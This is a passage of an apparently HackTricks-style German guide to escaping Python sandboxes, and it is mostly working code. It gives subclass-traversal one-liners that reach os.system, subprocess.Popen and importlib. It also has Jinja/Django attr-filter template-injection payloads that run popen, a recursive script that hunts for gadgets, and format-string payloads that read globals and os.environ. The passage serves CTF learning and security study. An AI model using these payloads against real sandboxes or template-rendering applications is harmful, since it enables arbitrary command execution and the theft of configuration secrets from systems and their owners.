<class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
# Without the use of the dir() function
[ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__)]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'zipimport.zipimporter'>, <class 'zipimport._ZipImportResourceReader'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'reprlib.Repr'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'sre_parse.State'>, <class 'sre_parse.SubPattern'>, <class 'sre_parse.Tokenizer'>, <class 're.Scanner'>, <class 'rlcompleter.Completer'>, <class 'dis.Bytecode'>, <class 'string.Template'>, <class 'cmd.Cmd'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'bdb.Bdb'>, <class 'bdb.Breakpoint'>, <class 'traceback.FrameSummary'>, <class 'traceback.TracebackException'>, <class '__future__._Feature'>, <class 'codeop.Compile'>, <class 'codeop.CommandCompiler'>, <class 'code.InteractiveInterpreter'>, <class 'pprint._safe_key'>, <class 'pprint.PrettyPrinter'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>]
```
[**Unten finden Sie eine größere Funktion**](./#rekursive-suche-von-builtins-globals), um Dutzende/**Hunderte** von **Stellen** zu finden, an denen Sie die **globals** finden können.

## Entdeckung der willkürlichen Ausführung

Hier möchte ich erklären, wie man leichter gefährlichere Funktionalitäten entdecken und zuverlässigere Exploits vorschlagen kann.

#### Zugriff auf Unterklassen mit Umgehungen

Eine der sensibelsten Teile dieser Technik besteht darin, auf die Basisklassen zugreifen zu können. In den vorherigen Beispielen wurde dies mit `''.__class__.__base__.__subclasses__()` gemacht, aber es gibt **andere mögliche Wege**:
```python
#You can access the base from mostly anywhere (in regular conditions)
"".__class__.__base__.__subclasses__()
[].__class__.__base__.__subclasses__()
{}.__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()
(1).__class__.__base__.__subclasses__()
bool.__class__.__base__.__subclasses__()
print.__class__.__base__.__subclasses__()
open.__class__.__base__.__subclasses__()
defined_func.__class__.__base__.__subclasses__()

#You can also access it without "__base__" or "__class__"
# You can apply the previous technique also here
"".__class__.__bases__[0].__subclasses__()
"".__class__.__mro__[1].__subclasses__()
"".__getattribute__("__class__").mro()[1].__subclasses__()
"".__getattribute__("__class__").__base__.__subclasses__()

# This can be useful in case it is not possible to make calls (therefore using decorators)
().__class__.__class__.__subclasses__(().__class__.__class__)[0].register.__builtins__["breakpoint"]() # From https://github.com/salvatore-abello/python-ctf-cheatsheet/tree/main/pyjails#no-builtins-no-mro-single-exec

#If attr is present you can access everything as a string
# This is common in Django (and Jinja) environments
(''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()|attr('__getitem__')(132)|attr('__init__')|attr('__globals__')|attr('__getitem__')('popen'))('cat+flag.txt').read()
(''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')(1)|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(132)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('popen'))('cat+flag.txt').read()
```
### Gefährliche geladene Bibliotheken finden

Zum Beispiel, wenn man weiß, dass es mit der Bibliothek **`sys`** möglich ist, **beliebige Bibliotheken zu importieren**, kann man nach allen **geladenen Modulen suchen, die sys importiert haben**:
```python
[ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
['_ModuleLock', '_DummyModuleLock', '_ModuleLockManager', 'ModuleSpec', 'FileLoader', '_NamespacePath', '_NamespaceLoader', 'FileFinder', 'zipimporter', '_ZipImportResourceReader', 'IncrementalEncoder', 'IncrementalDecoder', 'StreamReaderWriter', 'StreamRecoder', '_wrap_close', 'Quitter', '_Printer', 'WarningMessage', 'catch_warnings', '_GeneratorContextManagerBase', '_BaseExitStack', 'Untokenizer', 'FrameSummary', 'TracebackException', 'CompletedProcess', 'Popen', 'finalize', 'NullImporter', '_HackedGetData', '_localized_month', '_localized_day', 'Calendar', 'different_locale', 'SSLObject', 'Request', 'OpenerDirector', 'HTTPPasswordMgr', 'AbstractBasicAuthHandler', 'AbstractDigestAuthHandler', 'URLopener', '_PaddedFile', 'CompressedValue', 'LogRecord', 'PercentStyle', 'Formatter', 'BufferingFormatter', 'Filter', 'Filterer', 'PlaceHolder', 'Manager', 'LoggerAdapter', '_LazyDescr', '_SixMetaPathImporter', 'MimeTypes', 'ConnectionPool', '_LazyDescr', '_SixMetaPathImporter', 'Bytecode', 'BlockFinder', 'Parameter', 'BoundArguments', 'Signature', '_DeprecatedValue', '_ModuleWithDeprecations', 'Scrypt', 'WrappedSocket', 'PyOpenSSLContext', 'ZipInfo', 'LZMACompressor', 'LZMADecompressor', '_SharedFile', '_Tellable', 'ZipFile', 'Path', '_Flavour', '_Selector', 'JSONDecoder', 'Response', 'monkeypatch', 'InstallProgress', 'TextProgress', 'BaseDependency', 'Origin', 'Version', 'Package', '_Framer', '_Unframer', '_Pickler', '_Unpickler', 'NullTranslations']
```
Es gibt viele, und **wir brauchen nur einen**, um Befehle auszuführen:
```python
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
```
Wir können dasselbe mit **anderen Bibliotheken** tun, von denen wir wissen, dass sie zur **Ausführung von Befehlen** verwendet werden können:
```python
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen' ][0]('ls')

#builtins
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "__bultins__" in x.__init__.__globals__ ]
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")
```
Darüber hinaus könnten wir sogar nachsehen, welche Module bösartige Bibliotheken laden:
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
for b in bad_libraries_names:
vuln_libs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and b in x.__init__.__globals__ ]
print(f"{b}: {', '.join(vuln_libs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pdb:
"""
```
Darüber hinaus, wenn Sie der Meinung sind, dass **andere Bibliotheken** in der Lage sein könnten, **Funktionen aufzurufen, um Befehle auszuführen**, können wir auch nach Funktionen in den möglichen Bibliotheken **filtern**.
```python
bad_libraries_names = ["os", "commands", "subprocess", "pty", "importlib", "imp", "sys", "builtins", "pip", "pdb"]
bad_func_names = ["system", "popen", "getstatusoutput", "getoutput", "call", "Popen", "spawn", "import_module", "__import__", "load_source", "execfile", "execute", "__builtins__"]
for b in bad_libraries_names + bad_func_names:
vuln_funcs = [ x.__name__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) for k in x.__init__.__globals__ if k == b ]
print(f"{b}: {', '.join(vuln_funcs)}")

"""
os: CompletedProcess, Popen, NullImporter, _HackedGetData, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, HTTPConnection, MimeTypes, BlockFinder, Parameter, BoundArguments, Signature, _FragList, _SSHFormatECDSA, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _CallbackExceptionHelper, Context, Connection, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, Cookie, CookieJar, BaseAdapter, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, NullTranslations
commands:
subprocess: BaseDependency, Origin, Version, Package
pty:
importlib: NullImporter, _HackedGetData, BlockFinder, Parameter, BoundArguments, Signature, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path
imp:
sys: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, WarningMessage, catch_warnings, _GeneratorContextManagerBase, _BaseExitStack, Untokenizer, FrameSummary, TracebackException, CompletedProcess, Popen, finalize, NullImporter, _HackedGetData, _localized_month, _localized_day, Calendar, different_locale, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, CompressedValue, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, MimeTypes, ConnectionPool, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, Scrypt, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, JSONDecoder, Response, monkeypatch, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
builtins: FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, Repr, Completer, CompletedProcess, Popen, _PaddedFile, BlockFinder, Parameter, BoundArguments, Signature
pip:
pdb:
system: _wrap_close, _wrap_close
getstatusoutput: CompletedProcess, Popen
getoutput: CompletedProcess, Popen
call: CompletedProcess, Popen
Popen: CompletedProcess, Popen
spawn:
import_module:
__import__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec
load_source: NullImporter, _HackedGetData
execfile:
execute:
__builtins__: _ModuleLock, _DummyModuleLock, _ModuleLockManager, ModuleSpec, FileLoader, _NamespacePath, _NamespaceLoader, FileFinder, zipimporter, _ZipImportResourceReader, IncrementalEncoder, IncrementalDecoder, StreamReaderWriter, StreamRecoder, _wrap_close, Quitter, _Printer, DynamicClassAttribute, _GeneratorWrapper, WarningMessage, catch_warnings, Repr, partialmethod, singledispatchmethod, cached_property, _GeneratorContextManagerBase, _BaseExitStack, Completer, State, SubPattern, Tokenizer, Scanner, Untokenizer, FrameSummary, TracebackException, _IterationGuard, WeakSet, _RLock, Condition, Semaphore, Event, Barrier, Thread, CompletedProcess, Popen, finalize, _TemporaryFileCloser, _TemporaryFileWrapper, SpooledTemporaryFile, TemporaryDirectory, NullImporter, _HackedGetData, DOMBuilder, DOMInputSource, NamedNodeMap, TypeInfo, ReadOnlySequentialNamedNodeMap, ElementInfo, Template, Charset, Header, _ValueFormatter, _localized_month, _localized_day, Calendar, different_locale, AddrlistClass, _PolicyBase, BufferedSubFile, FeedParser, Parser, BytesParser, Message, HTTPConnection, SSLObject, Request, OpenerDirector, HTTPPasswordMgr, AbstractBasicAuthHandler, AbstractDigestAuthHandler, URLopener, _PaddedFile, Address, Group, HeaderRegistry, ContentManager, CompressedValue, _Feature, LogRecord, PercentStyle, Formatter, BufferingFormatter, Filter, Filterer, PlaceHolder, Manager, LoggerAdapter, _LazyDescr, _SixMetaPathImporter, Queue, _PySimpleQueue, HMAC, Timeout, Retry, HTTPConnection, MimeTypes, RequestField, RequestMethods, DeflateDecoder, GzipDecoder, MultiDecoder, ConnectionPool, CharSetProber, CodingStateMachine, CharDistributionAnalysis, JapaneseContextAnalysis, UniversalDetector, _LazyDescr, _SixMetaPathImporter, Bytecode, BlockFinder, Parameter, BoundArguments, Signature, _DeprecatedValue, _ModuleWithDeprecations, DSAParameterNumbers, DSAPublicNumbers, DSAPrivateNumbers, ObjectIdentifier, ECDSA, EllipticCurvePublicNumbers, EllipticCurvePrivateNumbers, RSAPrivateNumbers, RSAPublicNumbers, DERReader, BestAvailableEncryption, CBC, XTS, OFB, CFB, CFB8, CTR, GCM, Cipher, _CipherContext, _AEADCipherContext, AES, Camellia, TripleDES, Blowfish, CAST5, ARC4, IDEA, SEED, ChaCha20, _FragList, _SSHFormatECDSA, Hash, SHAKE128, SHAKE256, BLAKE2b, BLAKE2s, NameAttribute, RelativeDistinguishedName, Name, RFC822Name, DNSName, UniformResourceIdentifier, DirectoryName, RegisteredID, IPAddress, OtherName, Extensions, CRLNumber, AuthorityKeyIdentifier, SubjectKeyIdentifier, AuthorityInformationAccess, SubjectInformationAccess, AccessDescription, BasicConstraints, DeltaCRLIndicator, CRLDistributionPoints, FreshestCRL, DistributionPoint, PolicyConstraints, CertificatePolicies, PolicyInformation, UserNotice, NoticeReference, ExtendedKeyUsage, TLSFeature, InhibitAnyPolicy, KeyUsage, NameConstraints, Extension, GeneralNames, SubjectAlternativeName, IssuerAlternativeName, CertificateIssuer, CRLReason, InvalidityDate, PrecertificateSignedCertificateTimestamps, SignedCertificateTimestamps, OCSPNonce, IssuingDistributionPoint, UnrecognizedExtension, CertificateSigningRequestBuilder, CertificateBuilder, CertificateRevocationListBuilder, RevokedCertificateBuilder, _OpenSSLError, Binding, _X509NameInvalidator, PKey, _EllipticCurve, X509Name, X509Extension, X509Req, X509, X509Store, X509StoreContext, Revoked, CRL, PKCS12, NetscapeSPKI, _PassphraseHelper, _CallbackExceptionHelper, Context, Connection, _CipherContext, _CMACContext, _X509ExtensionParser, DHPrivateNumbers, DHPublicNumbers, DHParameterNumbers, _DHParameters, _DHPrivateKey, _DHPublicKey, Prehashed, _DSAVerificationContext, _DSASignatureContext, _DSAParameters, _DSAPrivateKey, _DSAPublicKey, _ECDSASignatureContext, _ECDSAVerificationContext, _EllipticCurvePrivateKey, _EllipticCurvePublicKey, _Ed25519PublicKey, _Ed25519PrivateKey, _Ed448PublicKey, _Ed448PrivateKey, _HashContext, _HMACContext, _Certificate, _RevokedCertificate, _CertificateRevocationList, _CertificateSigningRequest, _SignedCertificateTimestamp, OCSPRequestBuilder, _SingleResponse, OCSPResponseBuilder, _OCSPResponse, _OCSPRequest, _Poly1305Context, PSS, OAEP, MGF1, _RSASignatureContext, _RSAVerificationContext, _RSAPrivateKey, _RSAPublicKey, _X25519PublicKey, _X25519PrivateKey, _X448PublicKey, _X448PrivateKey, Scrypt, PKCS7SignatureBuilder, Backend, GetCipherByName, WrappedSocket, PyOpenSSLContext, ZipInfo, LZMACompressor, LZMADecompressor, _SharedFile, _Tellable, ZipFile, Path, _Flavour, _Selector, RawJSON, JSONDecoder, JSONEncoder, Cookie, CookieJar, MockRequest, MockResponse, Response, BaseAdapter, UnixHTTPConnection, monkeypatch, JSONDecoder, JSONEncoder, InstallProgress, TextProgress, BaseDependency, Origin, Version, Package, _WrappedLock, Cache, ProblemResolver, _FilteredCacheHelper, FilteredCache, _Framer, _Unframer, _Pickler, _Unpickler, NullTranslations, _wrap_close
"""
```
## Rekursive Suche nach Builtins, Globals...

{% hint style="warning" %}
Das ist einfach **genial**. Wenn du **nach einem Objekt wie globals, builtins, open oder irgendetwas anderem** suchst, verwende einfach dieses Skript, um **rekursiv nach Orten zu suchen, an denen du dieses Objekt finden kannst**.
{% endhint %}
```python
import os, sys # Import these to find more gadgets

SEARCH_FOR = {
# Misc
"__globals__": set(),
"builtins": set(),
"__builtins__": set(),
"open": set(),

# RCE libs
"os": set(),
"subprocess": set(),
"commands": set(),
"pty": set(),
"importlib": set(),
"imp": set(),
"sys": set(),
"pip": set(),
"pdb": set(),

# RCE methods
"system": set(),
"popen": set(),
"getstatusoutput": set(),
"getoutput": set(),
"call": set(),
"Popen": set(),
"popen": set(),
"spawn": set(),
"import_module": set(),
"__import__": set(),
"load_source": set(),
"execfile": set(),
"execute": set()
}

#More than 4 is very time consuming
MAX_CONT = 4

#The ALREADY_CHECKED makes the script run much faster, but some solutions won't be found
#ALREADY_CHECKED = set()

def check_recursive(element, cont, name, orig_n, orig_i, execute):
# If bigger than maximum, stop
if cont > MAX_CONT:
return

# If already checked, stop
#if name and name in ALREADY_CHECKED:
#    return

# Add to already checked
#if name:
#    ALREADY_CHECKED.add(name)

# If found add to the dict
for k in SEARCH_FOR:
if k in dir(element) or (type(element) is dict and k in element):
SEARCH_FOR[k].add(f"{orig_i}: {orig_n}.{name}")

# Continue with the recursivity
for new_element in dir(element):
try:
check_recursive(getattr(element, new_element), cont+1, f"{name}.{new_element}", orig_n, orig_i, execute)

# WARNING: Calling random functions sometimes kills the script
# Comment this part if you notice that behaviour!!
if execute:
try:
if callable(getattr(element, new_element)):
check_recursive(getattr(element, new_element)(), cont+1, f"{name}.{new_element}()", orig_i, execute)
except:
pass

except:
pass

# If in a dict, scan also each key, very important
if type(element) is dict:
for new_element in element:
check_recursive(element[new_element], cont+1, f"{name}[{new_element}]", orig_n, orig_i)


def main():
print("Checking from empty string...")
total = [""]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Empty str {i}", True)

print()
print("Checking loaded subclasses...")
total = "".__class__.__base__.__subclasses__()
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Subclass {i}", True)

print()
print("Checking from global functions...")
total = [print, check_recursive]
for i,element in enumerate(total):
print(f"\rStatus: {i}/{len(total)}", end="")
cont = 1
check_recursive(element, cont, "", str(element), f"Global func {i}", False)

print()
print(SEARCH_FOR)


if __name__ == "__main__":
main()
```
Sie können das Ergebnis dieses Skripts auf dieser Seite überprüfen:

{% content-ref url="broken-reference" %}
[Kaputter Link](broken-reference)
{% endcontent-ref %}

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Python Format String

Wenn Sie eine Zeichenkette an Python **senden**, die **formatiert** werden soll, können Sie `{}` verwenden, um auf **interne Python-Informationen** zuzugreifen. Sie können die vorherigen Beispiele verwenden, um beispielsweise auf Globals oder Builtins zuzugreifen.

{% hint style="info" %}
Es gibt jedoch eine **Einschränkung**: Sie können nur die Symbole `.[]` verwenden. Sie können also **keinen beliebigen Code ausführen**, sondern nur Informationen lesen.\
_**Wenn Sie wissen, wie Sie Code über diese Schwachstelle ausführen können, kontaktieren Sie mich bitte.**_
{% endhint %}
```python
# Example from https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
CONFIG = {
"KEY": "ASXFYFGK78989"
}

class PeopleInfo:
def __init__(self, fname, lname):
self.fname = fname
self.lname = lname

def get_name_for_avatar(avatar_str, people_obj):
return avatar_str.format(people_obj = people_obj)

people = PeopleInfo('GEEKS', 'FORGEEKS')

st = "{people_obj.__init__.__globals__[CONFIG][KEY]}"
get_name_for_avatar(st, people_obj = people)
```
Beachten Sie, wie Sie auf Attribute auf normale Weise mit einem Punkt wie `people_obj.__init__` und auf ein Dictionary-Element mit Klammern ohne Anführungszeichen wie `__globals__[CONFIG]` zugreifen können.

Beachten Sie auch, dass Sie `.__dict__` verwenden können, um Elemente eines Objekts aufzulisten `get_name_for_avatar("{people_obj.__init__.__globals__[os].__dict__}", people_obj = people)`

Einige andere interessante Eigenschaften von Formatzeichenketten sind die Möglichkeit, die Funktionen `str`, `repr` und `ascii` im angegebenen Objekt auszuführen, indem Sie `!s`, `!r` bzw. `!a` hinzufügen:
```python
st = "{people_obj.__init__.__globals__[CONFIG][KEY]!a}"
get_name_for_avatar(st, people_obj = people)
```
Darüber hinaus ist es möglich, **neue Formatter in Klassen zu programmieren**:
```python
class HAL9000(object):
def __format__(self, format):
if (format == 'open-the-pod-bay-doors'):
return "I'm afraid I can't do that."
return 'HAL 9000'

'{:open-the-pod-bay-doors}'.format(HAL9000())
#I'm afraid I can't do that.
```
**Weitere Beispiele** für **Format**-**String**-Beispiele finden Sie unter [**https://pyformat.info/**](https://pyformat.info)

{% hint style="danger" %}
Überprüfen Sie auch die folgende Seite für Gadgets, die sensible Informationen aus Python-Internen Objekten lesen:
{% endhint %}

{% content-ref url="../python-internal-read-gadgets.md" %}
[python-internal-read-gadgets.md](../python-internal-read-gadgets.md)
{% endcontent-ref %}

### Payloads zur Offenlegung sensibler Informationen
```python
{whoami.__class__.__dict__}
{whoami.__globals__[os].__dict__}
{whoami.__globals__[os].environ}
{whoami.__globals__[sys].path}
{whoami.__globals__[sys].modules}

# Access an element through several links
{whoami.__globals__[server].__dict__[bridge].__dict__[db].__dict__}
```
## Zerlegen von Python-Objekten

{% hint style="info" %}
Wenn Sie mehr über **Python-Bytecode** erfahren möchten, lesen Sie diesen **großartigen** Beitrag zum Thema: [**https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d**](https://towardsdatascience.com/understanding-python-bytecode-e7edaae8734d)
{% endhint %}

In einigen CTFs erhalten Sie möglicherweise den Namen einer **benutzerdefinierten Funktion, in der sich die Flagge** befindet, und Sie müssen die **Interna** der **Funktion** untersuchen, um sie zu extrahieren.

Dies ist die zu untersuchende Funktion:
```python
def get_flag(some_input):
var1=1
var2="secretcode"
var3=["some","array"]
if some_input == var2:
return "THIS-IS-THE-FALG!"
else:
return "Nope"
```
#### dir

Die `dir` Funktion in Python gibt eine sortierte Liste aller Namen, die in einem Namespace definiert sind, zurück. Wenn kein Argument übergeben wird, gibt `dir` die Namen im aktuellen lokalen Namespace zurück. Wenn ein Objekt als Argument übergeben wird, gibt `dir` die Namen im Namespace des Objekts zurück.

Die `dir` Funktion kann verwendet werden, um die verfügbaren Attribute und Methoden eines Objekts zu überprüfen. Dies ist besonders nützlich, wenn Sie mit Modulen oder Klassen arbeiten und wissen möchten, welche Funktionen und Variablen verfügbar sind.

Beispiel:

```python
import math

print(dir())  # Gibt die Namen im aktuellen lokalen Namespace aus
print(dir(math))  # Gibt die Namen im math Namespace aus
```

Ausgabe:

```
['__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'math']
